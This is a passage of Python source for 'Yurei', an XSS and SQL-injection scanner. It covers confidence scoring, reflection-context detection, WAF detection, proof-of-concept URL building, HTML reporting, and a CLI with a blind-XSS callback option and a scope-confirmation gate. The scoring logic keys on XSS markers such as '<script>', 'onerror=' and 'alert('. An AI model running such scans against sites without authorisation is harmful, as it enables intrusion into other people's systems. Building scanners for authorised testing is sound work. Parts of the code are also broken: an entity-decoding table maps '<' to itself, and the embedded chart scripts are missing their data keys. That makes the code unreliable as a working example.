            # Bonus if reflection is exact and not in baseline
            if normalized_payload in normalized_response and normalized_payload not in baseline_text:
                confidence += 20
            # Bonus for dangerous characters in payload
            if any(c in payload for c in ['<', '>', 'script', 'onerror', 'onload']):
                confidence += 15
        elif dangerous_pattern_found:
            confidence = pattern_confidence
        # Context-based confidence
        context_weights = {
            'script_context': 40,
            'html_attribute': 30,
            'svg_context': 35,
            'url_attribute': 25,
            'json_context': 20,
            'html_tag': 30,
            'html_body': 25,
            'html_comment': 10,
            'unknown': 5
        }
        confidence += context_weights.get(context, 5)
        # Payload complexity bonus
        if any(x in payload.lower() for x in ['alert(', 'confirm(', 'prompt(']):
            confidence += 15
        elif any(x in payload for x in ['<script>', 'onerror=', 'javascript:', 'onload=']):
            confidence += 10
        # Response code penalty for errors
        if response.status_code in [400, 403, 406, 429]:
            confidence -= 15
        # Response time anomaly (potential WAF)
        if response_time > 5.0:
            confidence -= 10
        # Special boost for known vulnerable testbeds
        testbed_domains = [
            'testphp.vulnweb.com',
            'xss-game.appspot.com',
            'portswigger-labs.net',
            'vuln.site',
            'dvwa',
            'owasp',
        ]
        if any(domain in url for domain in testbed_domains):
            confidence += 20
            # Cap at 100
            confidence = min(100, confidence)
        # Minimum confidence for known dangerous patterns
        if dangerous_pattern_found and confidence < 70:
            confidence = 70
        # Ensure confidence is between 0 and 100
        confidence = max(0, min(100, confidence))
        # Accept even low confidence for testbeds or dangerous patterns
        if confidence < 30:
            if not dangerous_pattern_found and not any(domain in url for domain in testbed_domains):
                return None
        # Determine injection type
        injection_type = self._determine_injection_type(context, param_type)
        # Create PoC
        poc = self._create_poc(url, parameter, payload, param_type)
        # Extract evidence snippet
        evidence = self._extract_evidence(response_text, matched_variant if matched_variant else payload)
        # Determine reflection position
        reflection_position = self._get_reflection_position(response_text, matched_variant if matched_variant else payload)
        finding = Finding(
            url=url,
            parameter=parameter,
            payload=payload,
            injection_type=injection_type,
            context=context,
            confidence=int(confidence),
            evidence=evidence[:500],
            poc=poc,
            response_code=response.status_code,
            reflection_position=reflection_position
        )
        return finding

    def _html_decode(self, s: str) -> str:
        """Decode common HTML entities"""
        html_entities = {
            '<': '<',
            '>': '>',
            '&quot;': '"',
            '&#x27;': "'",
            '&amp;': '&',
            '&#x2F;': '/',
            '&apos;': "'",
            '&nbsp;': ' ',
            '&colon;': ':',
            '&Tab;': '\t',
            '&NewLine;': '\n',
        }
        for entity, char in html_entities.items():
            s = s.replace(entity, char)
        return s

    def _determine_context(self, text: str, payload: str) -> str:
        """Determine the context where payload is reflected"""
        # Find payload position
        pos = text.find(payload)
        if pos == -1:
            decoded_payload = self._html_decode(payload)
            pos = text.find(decoded_payload)
        if pos == -1:
            url_decoded = urllib.parse.unquote(payload)
            pos = text.find(url_decoded)
        if pos == -1:
            return "unknown"
        # Look at surrounding text
        start = max(0, pos - 100)
        end = min(len(text), pos + len(payload) + 100)
        context_snippet = text[start:end]
        # Check for script context
        if re.search(r'<script[^>]*>.*' + re.escape(payload) + r'.*</script>', context_snippet, re.DOTALL | re.IGNORECASE):
            return "script_context"
        # Check for SVG context
        if re.search(r'<svg[^>]*>.*' + re.escape(payload) + r'.*</svg>', context_snippet, re.DOTALL | re.IGNORECASE):
            return "svg_context"
        # Check for HTML tag context
        if re.search(r'<[^>]*' + re.escape(payload) + r'[^>]*>', context_snippet, re.IGNORECASE):
            return "html_tag"
        # Check for attribute context
        if re.search(r'([a-zA-Z-]+)\s*=\s*["\'][^"\']*' + re.escape(payload), context_snippet, re.IGNORECASE):
            return "html_attribute"
        # Check for URL context
        if re.search(r'(href|src|action|data)\s*=\s*["\'][^"\']*' + re.escape(payload), context_snippet, re.IGNORECASE):
            return "url_attribute"
        # Check for JSON context
        if re.search(r'[{,]\s*"[^"]*"\s*:\s*[^}]*' + re.escape(payload), context_snippet, re.IGNORECASE):
            return "json_context"
        # Check for comment context
        if re.search(r'<!--.*' + re.escape(payload) + r'.*-->', context_snippet, re.DOTALL | re.IGNORECASE):
            return "html_comment"
        return "html_body"

    def _determine_injection_type(self, context: str, param_type: str) -> str:
        """Determine the type of XSS injection"""
        if context == "script_context":
            return "dom"
        elif context in ["html_tag", "html_attribute", "url_attribute", "svg_context"]:
            if param_type == "json":
                return "json-based"
            else:
                return "reflected"
        elif context == "json_context":
            return "json-based"
        else:
            return "reflected"

    def _create_poc(self, url: str, parameter: str, payload: str, param_type: str) -> str:
        """Create Proof of Concept URL or request"""
        if param_type == "query":
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            query_params[parameter] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            return parsed._replace(query=new_query).geturl()
        elif param_type == "json":
            return f"POST {url} with JSON body: {{{parameter}: {json.dumps(payload)}}}"
        else:
            return f"{url} (inject '{payload}' in {param_type} parameter '{parameter}')"

    def _extract_evidence(self, text: str, payload: str) -> str:
        """Extract evidence snippet around the payload"""
        pos = text.find(payload)
        if pos == -1:
            decoded_payload = self._html_decode(payload)
            pos = text.find(decoded_payload)
        if pos == -1:
            url_decoded = urllib.parse.unquote(payload)
            pos = text.find(url_decoded)
        if pos == -1:
            return "Payload not found in response (but dangerous pattern detected)"
        start = max(0, pos - 200)
        end = min(len(text), pos + len(payload) + 200)
        snippet = text[start:end]
        return snippet

    def _get_reflection_position(self, text: str, payload: str) -> str:
        """Get the position where payload is reflected"""
        pos = text.find(payload)
        if pos == -1:
            decoded_payload = self._html_decode(payload)
            pos = text.find(decoded_payload)
        if pos == -1:
            url_decoded = urllib.parse.unquote(payload)
            pos = text.find(url_decoded)
        if pos == -1:
            return "pattern_detected"
        if pos < len(text) / 3:
            return "top"
        elif pos < 2 * len(text) / 3:
            return "middle"
        else:
            return "bottom"

    def _is_waf_blocked(self, response: httpx.Response) -> bool:
        """Detect if WAF blocked the request"""
        # Common WAF indicators
        waf_indicators = [
            "waf", "firewall", "blocked", "forbidden", "security", 
            "cloudflare", "akamai", "sucuri", "imperva", "f5",
            "request denied", "access denied", "not acceptable",
            "unacceptable", "x-sucuri-id", "cf-ray"
        ]
        # Check status code
        if response.status_code in [403, 406, 429, 503]:
            return True
        # Check headers
        for header in response.headers:
            if any(indicator in header.lower() for indicator in waf_indicators):
                return True
        # Check content
        content = response.text.lower() if hasattr(response, 'text') else ""
        if any(indicator in content for indicator in waf_indicators):
            return True
        return False

    async def _apply_rate_limit(self):
        """Apply rate limiting"""
        if not self.rate_limit:
            return
        # Calculate time to wait
        current_time = time.time()
        time_passed = current_time - self.rate_limit_start
        expected_time = self.request_count / self.rate_limit
        if time_passed < expected_time:
            wait_time = expected_time - time_passed
            await asyncio.sleep(wait_time)
        self.request_count += 1
        # Reset counter every minute to avoid drift
        if time_passed > 60:
            self.rate_limit_start = current_time
            self.request_count = 1

    async def _execute_tasks_with_rate_limit(self, tasks: List[asyncio.Task]):
        """Execute tasks with rate limiting"""
        for task in tasks:
            await task  # Rate limiting is handled in _scan_task

    def _might_accept_post(self, url: str) -> bool:
        """Heuristic to determine if URL might accept POST requests"""
        indicators = ['/api/', '/rest/', '/graphql', '/search', '/query', '/submit', '/update', '/create', '.php', '.asp', '.jsp']
        return any(indicator in url.lower() for indicator in indicators)

    def _print_finding(self, finding: Finding):
        """Print finding to console with enhanced formatting"""
        if RICH_AVAILABLE:
            # Create colored output with rich
            if "sqli" in finding.injection_type:
                color = "red"
                title_prefix = "🚨 SQL Injection Finding"
            else:
                color = "red" if finding.confidence > 70 else "yellow" if finding.confidence > 40 else "green"
                title_prefix = "👻 XSS Finding"
            panel_content = f"""[bold cyan]URL:[/bold cyan] {finding.url}
[bold cyan]Parameter:[/bold cyan] {finding.parameter}
[bold cyan]Type:[/bold cyan] {finding.injection_type}
[bold cyan]Context:[/bold cyan] {finding.context}
[bold cyan]Confidence:[/bold cyan] [bold {color}]{finding.confidence}%[/bold {color}]
[bold cyan]Payload:[/bold cyan] {finding.payload}
[bold cyan]PoC:[/bold cyan] {finding.poc}
[bold cyan]Evidence:[/bold cyan] {finding.evidence[:300]}{'...' if len(finding.evidence) > 300 else ''}
[bold cyan]Status Code:[/bold cyan] {finding.response_code}
[bold cyan]Reflection:[/bold cyan] {finding.reflection_position}"""
            console.print(Panel(panel_content, title=f"[bold {color}]{title_prefix} #{len([f for f in self.findings if f.url == finding.url])}[/bold {color}]", border_style=color))
        else:
            # Plain text output
            vuln_type = "SQL INJECTION" if "sqli" in finding.injection_type else "XSS"
            print(f"\n{'='*80}")
            print(f"[{vuln_type}] Confidence: {finding.confidence}%")
            print(f"URL: {finding.url}")
            print(f"Parameter: {finding.parameter}")
            print(f"Type: {finding.injection_type}")
            print(f"Context: {finding.context}")
            print(f"Payload: {finding.payload}")
            print(f"PoC: {finding.poc}")
            print(f"Evidence: {finding.evidence[:300]}{'...' if len(finding.evidence) > 300 else ''}")
            print(f"HTTP Status: {finding.response_code}")
            print(f"Reflection Position: {finding.reflection_position}")
            print(f"{'='*80}\n")

class Reporter:
    """Handles output formatting and reporting"""
    def __init__(self, output_format: str = "json"):
        self.output_format = output_format

    def generate_report(self, findings: List[Finding], target_urls: List[str]) -> str:
        """Generate report in specified format"""
        if self.output_format == "json":
            return self._generate_json_report(findings, target_urls)
        elif self.output_format == "txt":
            return self._generate_txt_report(findings, target_urls)
        elif self.output_format == "html":
            return self._generate_html_report(findings, target_urls)
        else:
            return self._generate_json_report(findings, target_urls)

    def _generate_json_report(self, findings: List[Finding], target_urls: List[str]) -> str:
        """Generate JSON report"""
        report = {
            "scan_meta": {
                "tool": "Yurei",
                "version": "1.2-sqli-passive",
                "creator": "Lunar Lumos",
                "timestamp": time.time(),
                "target_count": len(target_urls),
                "finding_count": len(findings),
                "targets": target_urls
            },
            "findings": [finding.to_dict() for finding in findings]
        }
        return json.dumps(report, indent=2, ensure_ascii=False)

    def _generate_txt_report(self, findings: List[Finding], target_urls: List[str]) -> str:
        """Generate plain text report"""
        lines = []
        lines.append("YUREI XSS & SQL INJECTION SCAN REPORT")
        lines.append("=" * 50)
        lines.append(f"Scan completed at: {time.ctime()}")
        lines.append(f"Targets scanned: {len(target_urls)}")
        lines.append(f"Vulnerabilities found: {len(findings)}")
        lines.append("")
        for i, finding in enumerate(findings, 1):
            lines.append(f"Finding #{i}")
            lines.append("-" * 30)
            lines.append(f"URL: {finding.url}")
            lines.append(f"Parameter: {finding.parameter}")
            lines.append(f"Injection Type: {finding.injection_type}")
            lines.append(f"Context: {finding.context}")
            lines.append(f"Confidence: {finding.confidence}%")
            lines.append(f"Payload: {finding.payload}")
            lines.append(f"PoC: {finding.poc}")
            lines.append(f"Evidence: {finding.evidence[:200]}{'...' if len(finding.evidence) > 200 else ''}")
            lines.append(f"HTTP Status: {finding.response_code}")
            lines.append(f"Reflection Position: {finding.reflection_position}")
            lines.append("")
        return "\n".join(lines)

    def _generate_html_report(self, findings: List[Finding], target_urls: List[str]) -> str:
        """Generate ENHANCED & SAFE HTML report with modern UI, interactivity, and charts"""
        # Count findings by type and confidence for charts
        xss_count = len([f for f in findings if 'sqli' not in f.injection_type])
        sqli_count = len([f for f in findings if 'sqli' in f.injection_type])

        high_conf = len([f for f in findings if f.confidence > 70])
        med_conf = len([f for f in findings if 40 <= f.confidence <= 70])
        low_conf = len([f for f in findings if f.confidence < 40])

        # Start building the HTML
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yurei 👻 - XSS Injection Scan Report</title>
    <!-- Bootstrap CSS for modern styling -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Highlight.js for syntax highlighting -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
    <style>
        body {{
            background-color: #f8f9fa;
            padding-top: 4rem;
        }}
        .navbar {{
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .finding-card {{
            margin-bottom: 1.5rem;
            transition: transform 0.2s, box-shadow 0.2s;
        }}
        .finding-card:hover {{
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }}
        .confidence-high {{ background-color: #f8d7da; border-left: 4px solid #dc3545; }}
        .confidence-medium {{ background-color: #fff3cd; border-left: 4px solid #ffc107; }}
        .confidence-low {{ background-color: #d1e7dd; border-left: 4px solid #198754; }}
        .type-sqli {{ background-color: #f3e5f5; border-left-color: #6f42c1 !important; }}
        .evidence-box {{
            max-height: 200px;
            overflow-y: auto;
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 1rem;
            border-radius: 0.5rem;
            font-family: 'Courier New', Courier, monospace;
            white-space: pre-wrap;
        }}
        .copy-btn {{
            position: absolute;
            top: 10px;
            right: 10px;
            opacity: 0;
            transition: opacity 0.2s;
        }}
        .finding-card:hover .copy-btn {{
            opacity: 1;
        }}
        .filters {{
            margin-bottom: 2rem;
        }}
        .filter-btn {{
            margin-right: 0.5rem;
            margin-bottom: 0.5rem;
        }}
        .search-box {{
            margin-bottom: 2rem;
        }}
        .summary-card {{
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .chart-container {{
            height: 300px;
            margin-bottom: 2rem;
        }}
        footer {{
            margin-top: 3rem;
            padding: 2rem 0;
            background-color: #343a40;
            color: white;
        }}
        /* Custom button colors */
        .btn-outline-purple {{
            color: #6f42c1;
            border-color: #6f42c1;
        }}
        .btn-outline-purple:hover {{
            color: white;
            background-color: #6f42c1;
            border-color: #6f42c1;
        }}
        .btn.active {{
            background-color: #0d6efd;
            color: white;
        }}
    </style>
</head>
<body>
    <!-- Navigation Bar -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
        <div class="container">
            <a class="navbar-brand" href="#">
                <span style="color: #dc3545;">Yurei</span> 👻 Scan Report
            </a>
        </div>
    </nav>

    <div class="container">
        <!-- Report Header -->
        <div class="text-center my-5">
            <h1 class="display-4">Security Scan Report</h1>
            <p class="lead text-muted">Generated by Yurei 👻 - Illuminating the Invisible Corners of the Web with XSS.</p>
        </div>

        <!-- Summary Section -->
        <div class="row mb-5">
            <div class="col-md-4">
                <div class="card summary-card">
                    <div class="card-body">
                        <h5 class="card-title">Total Findings</h5>
                        <h2 class="display-4">{len(findings)}</h2>
                    </div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card summary-card">
                    <div class="card-body">
                        <h5 class="card-title">XSS Vulnerabilities</h5>
                        <h2 class="display-4">{xss_count}</h2>
                    </div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card summary-card">
                    <div class="card-body">
                        <h5 class="card-title">SQLi Error Leaks</h5>
                        <h2 class="display-4">{sqli_count}</h2>
                    </div>
                </div>
            </div>
        </div>

        <!-- Charts Section -->
        <div class="row mb-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <h5>Findings by Type</h5>
                    </div>
                    <div class="card-body">
                        <canvas id="typeChart"></canvas>
                    </div>
                </div>
            </div>
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <h5>Findings by Confidence</h5>
                    </div>
                    <div class="card-body">
                        <canvas id="confidenceChart"></canvas>
                    </div>
                </div>
            </div>
        </div>

        <!-- Search and Filter -->
        <div class="row filters">
            <div class="col-md-6 search-box">
                <input type="text" id="searchInput" class="form-control" placeholder="Search findings (URL, Payload, Parameter...)">
            </div>
            <div class="col-md-6">
                <button class="btn btn-outline-primary filter-btn active" data-filter="all">All</button>
                <button class="btn btn-outline-danger filter-btn" data-filter="xss">XSS</button>
                <button class="btn btn-outline-purple filter-btn" data-filter="sqli">SQLi</button>
                <button class="btn btn-outline-success filter-btn" data-filter="high">High Confidence</button>
                <button class="btn btn-outline-warning filter-btn" data-filter="medium">Medium Confidence</button>
                <button class="btn btn-outline-info filter-btn" data-filter="low">Low Confidence</button>
            </div>
        </div>

        <!-- Findings List -->
        <div id="findingsContainer">
        """

        # Generate HTML for each finding
        for i, finding in enumerate(findings, 1):
            # Determine CSS classes
            confidence_class = ""
            if finding.confidence > 70:
                confidence_class = "confidence-high"
            elif finding.confidence > 40:
                confidence_class = "confidence-medium"
            else:
                confidence_class = "confidence-low"

            if "sqli" in finding.injection_type:
                confidence_class += " type-sqli"

            # 🛡️ CRITICAL: ESCAPE ALL USER-CONTROLLED DATA 🛡️
            escaped_url = html.escape(finding.url)
            escaped_parameter = html.escape(finding.parameter)
            escaped_injection_type = html.escape(finding.injection_type)
            escaped_context = html.escape(finding.context)
            escaped_payload = html.escape(finding.payload)
            escaped_poc = html.escape(finding.poc)
            escaped_evidence = html.escape(finding.evidence)
            escaped_reflection_pos = html.escape(finding.reflection_position)

            # Create unique ID for collapsible
            finding_id = f"finding-{i}"

            html_content += f"""
            <div class="card finding-card {confidence_class}" data-finding-type="{'sqli' if 'sqli' in finding.injection_type else 'xss'}" data-confidence="{finding.confidence}">
                <div class="card-header" id="heading{i}">
                    <h5 class="mb-0">
                        <button class="btn btn-link text-decoration-none w-100 text-start" data-bs-toggle="collapse" data-bs-target="#{finding_id}" aria-expanded="true">
                            <span class="badge bg-{'danger' if finding.confidence > 70 else 'warning' if finding.confidence > 40 else 'success'}">
                                {finding.confidence}% Confidence
                            </span>
                            <span class="badge bg-{'purple' if 'sqli' in finding.injection_type else 'danger'} ms-2">
                                {'SQL Injection' if 'sqli' in finding.injection_type else 'XSS'}
                            </span>
                            #{i}: {escaped_url[:80]}{'...' if len(escaped_url) > 80 else ''}
                        </button>
                    </h5>
                </div>
                <div id="{finding_id}" class="collapse show" data-bs-parent="#findingsContainer">
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h6><span class="fw-bold">URL:</span> <a href="{escaped_url}" target="_blank" class="text-break">{escaped_url}</a></h6>
                                <h6><span class="fw-bold">Parameter:</span> {escaped_parameter}</h6>
                                <h6><span class="fw-bold">Injection Type:</span> {escaped_injection_type}</h6>
                                <h6><span class="fw-bold">Context:</span> {escaped_context}</h6>
                                <h6><span class="fw-bold">HTTP Status:</span> {finding.response_code}</h6>
                                <h6><span class="fw-bold">Reflection Position:</span> {escaped_reflection_pos}</h6>
                            </div>
                            <div class="col-md-6">
                                <h6><span class="fw-bold">Payload:</span></h6>
                                <div class="position-relative">
                                    <pre><code class="language-html" id="payload-{i}">{escaped_payload}</code></pre>
                                    <button class="btn btn-sm btn-outline-secondary copy-btn" onclick="copyToClipboard('payload-{i}')">📋 Copy</button>
                                </div>
                                <h6><span class="fw-bold">Proof of Concept (PoC):</span></h6>
                                <div class="position-relative">
                                    <pre><code class="language-bash" id="poc-{i}">{escaped_poc}</code></pre>
                                    <button class="btn btn-sm btn-outline-secondary copy-btn" onclick="copyToClipboard('poc-{i}')">📋 Copy</button>
                                </div>
                            </div>
                        </div>
                        <div class="row mt-3">
                            <div class="col-12">
                                <h6><span class="fw-bold">Evidence Snippet:</span></h6>
                                <div class="evidence-box">
{escaped_evidence}
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            """

        # Close findings container and add footer/scripts
        html_content += """
        </div> <!-- End of findingsContainer -->
    </div> <!-- End of container -->

    <footer class="text-center">
        <div class="container">
            <p>Report generated by <strong>Yurei 👻</strong> - Illuminating the Invisible Corners of the Web with XSS.</p>
            <p>Created by Lunar Lumos 🌙 | For authorized security testing only.</p>
        </div>
    </footer>

    <!-- Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Chart.js -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <!-- Highlight.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>

    <script>
        // Copy to clipboard function
        function copyToClipboard(elementId) {
            const element = document.getElementById(elementId);
            const text = element.textContent;
            navigator.clipboard.writeText(text).then(() => {
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {
                    button.textContent = originalText;
                }, 2000);
            }).catch(err => {
                console.error('Could not copy text: ', err);
                alert('Failed to copy. Please select and copy manually.');
            });
        }

        // DOMContentLoaded ensures the page is fully loaded before running scripts
        document.addEventListener('DOMContentLoaded', function() {
            const searchInput = document.getElementById('searchInput');
            const filterButtons = document.querySelectorAll('.filter-btn');
            const findings = document.querySelectorAll('.finding-card');

            // This function applies both search and filter
            function applyFilters() {
                const searchTerm = searchInput.value.toLowerCase();
                
                // Find the active filter button
                let activeFilter = 'all';
                for (let btn of filterButtons) {
                    if (btn.classList.contains('active')) {
                        activeFilter = btn.getAttribute('data-filter');
                        break;
                    }
                }

                // Process each finding
                for (let finding of findings) {
                    const textContent = finding.textContent.toLowerCase();
                    const findingType = finding.getAttribute('data-finding-type');
                    const confidenceLevel = parseInt(finding.getAttribute('data-confidence'));

                    // Check if it matches the search term
                    const matchesSearch = textContent.includes(searchTerm);

                    // Check if it matches the active filter
                    let matchesFilter = true;
                    if (activeFilter === 'xss') {
                        matchesFilter = findingType === 'xss';
                    } else if (activeFilter === 'sqli') {
                        matchesFilter = findingType === 'sqli';
                    } else if (activeFilter === 'high') {
                        matchesFilter = confidenceLevel > 70;
                    } else if (activeFilter === 'medium') {
                        matchesFilter = confidenceLevel > 40 && confidenceLevel <= 70;
                    } else if (activeFilter === 'low') {
                        matchesFilter = confidenceLevel <= 40;
                    }

                    // Show or hide the finding
                    if (matchesSearch && matchesFilter) {
                        finding.style.display = 'block';
                    } else {
                        finding.style.display = 'none';
                    }
                }
            }

            // Add event listener for the search box
            searchInput.addEventListener('input', applyFilters);

            // Add event listeners for all filter buttons
            for (let button of filterButtons) {
                button.addEventListener('click', function() {
                    // Remove 'active' class from all buttons
                    for (let btn of filterButtons) {
                        btn.classList.remove('active');
                    }
                    // Add 'active' class to the clicked button
                    this.classList.add('active');
                    // Apply the new filters
                    applyFilters();
                });
            }

            // Initialize by applying filters on page load
            applyFilters();
        });

        // Chart.js Charts
        document.addEventListener('DOMContentLoaded', function() {
            // Type Chart
            const typeCtx = document.getElementById('typeChart').getContext('2d');
            new Chart(typeCtx, {
                type: 'doughnut',
                 {
                    labels: ['XSS', 'SQL Injection'],
                    datasets: [{
                         [""" + str(xss_count) + ", " + str(sqli_count) + """],
                        backgroundColor: [
                            '#dc3545',
                            '#6f42c1'
                        ],
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    plugins: {
                        legend: {
                            position: 'top',
                        },
                        title: {
                            display: true,
                            text: 'Vulnerability Distribution'
                        }
                    }
                }
            });

            // Confidence Chart
            const confCtx = document.getElementById('confidenceChart').getContext('2d');
            new Chart(confCtx, {
                type: 'bar',
                 {
                    labels: ['High (>70%)', 'Medium (40-70%)', 'Low (<40%)'],
                    datasets: [{
                        label: 'Number of Findings',
                         [""" + str(high_conf) + ", " + str(med_conf) + ", " + str(low_conf) + """],
                        backgroundColor: [
                            '#dc3545',
                            '#ffc107',
                            '#198754'
                        ],
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    plugins: {
                        legend: {
                            display: false
                        },
                        title: {
                            display: true,
                            text: 'Findings by Confidence Level'
                        }
                    },
                    scales: {
                        y: {
                            beginAtZero: true,
                            ticks: {
                                stepSize: 1
                            }
                        }
                    }
                }
            });
        });
    </script>
</body>
</html>
        """
        return html_content

class YureiCLI:
    """Command Line Interface for Yurei"""
    def __init__(self):
        self.parser = self._create_parser()
        self.args = None

    def _create_parser(self) -> argparse.ArgumentParser:
        """Create argument parser"""
        parser = argparse.ArgumentParser(
            description="Yurei 👻 - Illuminating the Invisible Corners of the Web with XSS by Lunar Lumos 🌙",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Examples:
  yurei -u https://example.com/search?q=test
  yurei -l urls.txt -o report.html --format html
  yurei -u https://example.com --hidden-params --threads 30
            """
        )
        # Target specification
        target_group = parser.add_mutually_exclusive_group(required=True)
        target_group.add_argument("-u", "--url", help="Single target URL")
        target_group.add_argument("-l", "--list", help="File containing list of target URLs")
        # Output options
        parser.add_argument("-o", "--output", help="Output file path")
        parser.add_argument("--format", choices=["json", "txt", "html"], default="json", 
                          help="Output format (default: json)")
        # Performance options
        parser.add_argument("--threads", type=int, default=20, 
                          help="Number of concurrent threads (default: 20)")
        parser.add_argument("--timeout", type=int, default=10, 
                          help="Request timeout in seconds (default: 10)")
        parser.add_argument("--rate", type=int, help="Rate limit in requests per second")
        # Proxy and headers
        parser.add_argument("--proxy", help="Proxy URL (e.g., http://localhost:8080)")
        parser.add_argument("--headers", help="Custom headers as JSON string or file path")
        # Payload options
        parser.add_argument("--payloads", help="File containing custom payloads (one per line)")
        # Advanced options
        parser.add_argument("--hidden-params", action="store_true", 
                          help="Discover and test hidden/form parameters")
        parser.add_argument("--oob-callback", help="URL for blind XSS callback (OOB)")
        # Operational options
        parser.add_argument("--verbose", action="store_true", help="Verbose output")
        parser.add_argument("--confirm-scope", action="store_true", 
                          help="Confirm scope for ethical testing (REQUIRED)")
        return parser

    def parse_args(self) -> argparse.Namespace:
        """Parse command line arguments"""
        self.args = self.parser.parse_args()
        # Ethical safeguard
        if not self.args.confirm_scope:
            print("\n" + "="*80)
            print("Yurei 👻 - by Lunar Lumos 🌙")
            print("LEGAL DISCLAIMER: For authorized security testing only.")
            print("You must have explicit permission to scan the target.")
            print("Use --confirm-scope to acknowledge this requirement.")
            print("="*80 + "\n")
            sys.exit(1)
        # Validate URL if provided
        if self.args.url:
            if not self._is_valid_url(self.args.url):
                print(f"[!] Invalid URL: {self.args.url}")
                sys.exit(1)
        # Validate URL list file if provided
        if self.args.list:
            if not os.path.exists(self.args.list):
                print(f"[!] URL list file not found: {self.args.list}")
                sys.exit(1)
        # Parse headers if provided
        if self.args.headers:
            self.args.headers = self._parse_headers(self.args.headers)
        return self.args

    def _is_valid_url(self, url: str) -> bool:
        """Validate URL format"""
        try:
            result = urllib.parse.urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def _parse_headers(self, headers_arg: str) -> Dict[str, str]:
        """Parse headers from JSON string or file"""
        try:
            # Try to parse as JSON string
            headers = json.loads(headers_arg)
            if isinstance(headers, dict):
                return headers
        except json.JSONDecodeError:
            pass
        # Try to read from file
        if os.path.exists(headers_arg):
            try:
                with open(headers_arg, 'r') as f:
                    content = f.read().strip()
                    headers = json.loads(content)
                    if isinstance(headers, dict):
                        return headers
            except Exception as e:
                print(f"[!] Error reading headers file: {e}")
        print(f"[!] Invalid headers format: {headers_arg}")
        return {}

class Yurei:
    """Main Yurei class that orchestrates the scanning process"""
    def __init__(self, cli_args: argparse.Namespace):
        self.args = cli_args
        self.payload_engine = PayloadEngine(
            custom_payload_file=self.args.payloads,
            oob_callback=self.args.oob_callback
        )
        self.scanner = Scanner(
            payload_engine=self.payload_engine,
            threads=self.args.threads,
            timeout=self.args.timeout,
            proxy=self.args.proxy,
            headers=self.args.headers,
            rate_limit=self.args.rate,
            verbose=self.args.verbose
        )
        self.reporter = Reporter(output_format=self.args.format)
        self.findings = []
        self.target_urls = []
        # Set hidden params flag for scanner
        self.scanner.include_hidden = self.args.hidden_params if hasattr(self.args, 'hidden_params') else False

    async def run(self):
        """Run the scanner"""
        # Print banner
        self._print_banner()
        # Get target URLs
        self.target_urls = self._get_target_urls()
        if not self.target_urls:
            console.log("[!] No valid targets to scan")
            return
        console.log(f"[+] Starting scan of {len(self.target_urls)} targets")
        # Scan each URL
        for url in self.target_urls:
            console.log(f"[+] Scanning: {url}")
            url_findings = await self.scanner.scan_url(url)
            self.findings.extend(url_findings)
            console.log(f"[+] Found {len(url_findings)} vulnerabilities in {url}")
        # Generate report
        if self.findings:
            console.log(f"[+] Scan completed. Total vulnerabilities found: {len(self.findings)}")
            report = self.reporter.generate_report(self.findings, self.target_urls)
            # Output to file if specified
            if self.args.output:
                try:
                    with open(self.args.output, 'w', encoding='utf-8') as f:
                        f.write(report)
                    console.log(f"[+] Report saved to: {self.args.output}")
                except Exception as e:
                    console.log(f"[!] Error saving report: {e}")
            # Print summary to console
            self._print_summary()
        else:
            console.log("[+] Scan completed. No vulnerabilities found.")

    def _print_banner(self):
        """Print Yurei banner"""
        banner = """
        ┓┏      •
        ┗┫┓┏┏┓┏┓┓
        ┗┛┗┻┛ ┗ ┗
        Yurei 👻 - by Lunar Lumos 🌙
    Illuminating the Invisible Corners of the Web with XSS.
    Dedicated to 5!NH4 🌌
    ⚠️ Legal: Authorized security testing only. Use --confirm-scope.

        """
        if RICH_AVAILABLE:
            console.print(banner, style="bold cyan")
        else:
            print(banner)

    def _get_target_urls(self) -> List[str]:
        """Get list of target URLs to scan"""
        urls = []
        if self.args.url:
            urls.append(self.args.url)
        elif self.args.list:
            try:
                with open(self.args.list, 'r') as f:
                    for line in f:
                        url = line.strip()
                        if url and not url.startswith('#') and self._is_valid_url(url):
                            urls.append(url)
            except Exception as e:
                console.log(f"[!] Error reading URL list: {e}")
        return urls

    def _is_valid_url(self, url: str) -> bool:
        """Validate URL format"""
        try:
            result = urllib.parse.urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def _print_summary(self):
        """Print scan summary"""
        if RICH_AVAILABLE:
            table = Table(title="Scan Summary")
            table.add_column("Metric", style="cyan")
            table.add_column("Value", style="green")
            table.add_row("Targets Scanned", str(len(self.target_urls)))
            table.add_row("Total Findings", str(len(self.findings)))
            table.add_row("SQL Injection Findings", str(len([f for f in self.findings if 'sqli' in f.injection_type])))
            table.add_row("XSS Findings", str(len([f for f in self.findings if 'sqli' not in f.injection_type])))
